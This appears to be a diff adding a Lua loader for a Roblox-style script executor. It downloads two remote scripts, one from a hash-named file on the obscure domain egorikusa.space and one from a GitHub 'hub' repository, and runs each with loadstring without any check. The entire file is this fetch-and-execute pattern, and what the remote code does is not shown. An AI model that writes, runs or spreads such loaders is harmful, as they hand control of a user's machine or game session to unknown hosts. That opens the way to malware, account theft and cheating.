@@ -1,0 +1,43 @@
+-- Fetch and execute the first script
+local firstScript
+local firstScriptURL = "https://egorikusa.space/0a6213cb780669e58a1164f7.lua"
+
+local success1, error1 = pcall(function()
+    print("Fetching first script...")
+    local response = game:HttpGet(firstScriptURL, true)
+    print("First script fetched successfully!")
+    firstScript = loadstring(response)
+    if firstScript then
+        print("Executing first script...")
+        firstScript()
+        print("First script executed successfully!")
+    else
+        error("Failed to load the first script")
+    end
+end)
+
+if not success1 then
+    warn("Error with first script: " .. tostring(error1))
+end
+
+-- Fetch and execute the second script
+local secondScript
+local secondScriptURL = "https://raw.githubusercontent.com/ReQiuYTPL/hub/main/ReQiuYTPLHub.lua"
+
+local success2, error2 = pcall(function()
+    print("Fetching second script...")
+    local response = game:HttpGet(secondScriptURL, true)
+    print("Second script fetched successfully!")
+    secondScript = loadstring(response)
+    if secondScript then
+        print("Executing second script...")
+        secondScript()
+        print("Second script executed successfully!")
+    else
+        error("Failed to load the second script")
+    end
+end)
+
+if not success2 then
+    warn("Error with second script: " .. tostring(error2))
+end
